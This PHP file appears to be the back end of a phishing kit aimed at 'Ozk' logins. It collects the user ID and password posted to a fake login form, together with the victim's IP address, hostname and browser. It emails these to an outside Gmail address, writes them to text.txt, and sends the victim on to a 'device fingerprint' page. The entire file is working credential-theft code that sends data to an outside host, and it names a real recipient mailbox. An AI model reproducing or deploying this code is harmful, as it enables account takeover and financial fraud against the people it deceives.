<?php
$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "New Message\n";
$message .= "UserId : ".$_POST['id']."\n";
$message .= "Password : ".$_POST['psw']."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "IP Address $ip on $time\n";
$message .= "Browser: $useragent\n";
$message .= "----------------------By May-\n";

$subject = "New Ozk Login";

$send = "staerkelramee@gmail.com";
$from = "From: May <info@studio.com>";
$from .= "MIME-Version: 1.0\n";

mail($send,$subject,$message, $from);

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


header("Location: https://hubozk.web.app/devicefingerprint.html");


?>